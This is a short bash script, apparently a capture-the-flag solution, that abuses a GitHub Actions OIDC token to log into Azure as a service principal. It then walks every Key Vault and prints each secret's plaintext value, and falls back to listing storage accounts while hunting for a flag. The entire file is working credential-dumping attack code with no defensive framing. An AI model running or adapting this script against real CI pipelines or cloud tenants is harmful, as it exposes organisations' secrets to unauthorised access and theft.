#!/usr/bin/env bash
set -e
OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r '.value')

az login --service-principal \
  -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --output none

echo "=== WHOAMI ==="; az account show -o json

echo "=== KEY VAULTS ==="
for kv in $(az keyvault list --query "[].name" -o tsv); do
  for s in $(az keyvault secret list --vault-name "$kv" --query "[].name" -o tsv 2>/dev/null); do
    echo "--- $kv / $s ---"
    az keyvault secret show --vault-name "$kv" --name "$s" --query value -o tsv
  done
done

echo "=== STORAGE / blobs (nếu KV không có flag) ==="
az storage account list --query "[].name" -o tsv || true
